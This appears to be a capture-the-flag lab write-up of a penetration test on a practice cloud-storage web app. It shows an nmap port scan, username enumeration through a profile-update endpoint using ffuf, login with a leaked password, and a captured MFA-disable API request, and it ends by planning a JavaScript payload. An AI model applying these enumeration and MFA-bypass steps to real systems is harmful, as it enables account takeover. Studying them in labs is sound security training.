# Objective and scope
Hack Smarter is releasing a new SaaS platform for cloud storage. You have been hired to perform a full penetration test on the platform. The web app is in-scope, the client has also placed a "flag" on the machine. If this flag is retrieved, that is an immediate early disclosure as it demonstrates full compromise of the application.

The client has provisioned you with a standard user account

```python
Username: brian
Password: HackSmarter123!
```

During OSINT, your team identified a leaked password but are unsure of who it belongs to:

```python
cJ2yxWMs3XEHbO
```

Finally, they also gathered a list of potential usernames

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT 10.1.74.45              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-21 18:17 +0100
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 75.42% done; ETC: 18:17 (0:00:08 remaining)
Nmap scan report for 10.1.74.45
Host is up (0.096s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 33.72 seconds
```

# HTTP (8080)

![](Pasted%20image%2020260821181936.png)

Landing page is a login form

`admin:admin` returns `Invalid username or password`, so no username enum from the error

![](Pasted%20image%2020260821182059.png)

![](Pasted%20image%2020260821182159.png)

The provided creds for `brian` got me logged in

![](Pasted%20image%2020260821184305.png)

There is an option to update the users, i could spray this paramter with the username list, i would assume the app wont let me modify the username to be the same as an existing user

# Username enumeration via the `update_profile` endpoint

First ill proxy the request to caido and send the request to automate

```python
ffuf -X POST -u http://embedded.hsm:8080/update_profile -H 'Cookie: session=eyJ1c2VyX2lkIjoxfQ.aoiJvg.kJHxJYBsY7mtOuDfmiF7tVhGhCA' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=FUZZ' -w usernames.txt -fs 2700-2820

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://embedded.hsm:8080/update_profile
 :: Wordlist         : FUZZ: /home/kali/hsm/embedded/usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: session=eyJ1c2VyX2lkIjoxfQ.aoiJvg.kJHxJYBsY7mtOuDfmiF7tVhGhCA
 :: Data             : username=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2700-2820
________________________________________________

tommy                   [Status: 200, Size: 2829, Words: 910, Lines: 74, Duration: 191ms]
:: Progress: [501/501] :: Job [1/1] :: 123 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Ill pass the method of POST and the URL with the correct HTTP headers then finally the data in the request, ill use the provided usernames list and filter out a response range

I find the user `tommy`

![](Pasted%20image%2020260821185506.png)

After trying it, i get the error telling me the user already exists

Ill try this user with the password retrieved from OSINT

I get access but this user has MFA enabled!

# Access as `tommy`

So i already know the password is correct, but i need the MFA code to get access to the dashboard

Ill log back into brian and play with the enabled MFA function

So enabling it doesnt do anything interesting, but disabling it calls an API

```python
POST /api/mfa/disable HTTP/1.1
Host: embedded.hsm:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://embedded.hsm:8080/dashboard
Origin: http://embedded.hsm:8080
Connection: keep-alive
Cookie: session=eyJ1c2VyX2lkIjoxfQ.aoiUtw.UXn5tt18leXKnrc3YlQ9jPAZssg
Priority: u=0
Content-Length: 0
```

It takes the session ID

![](Pasted%20image%2020260821191523.png)

My thinking is i can send a javascript payload to `tommy` to call the API and disable MFA



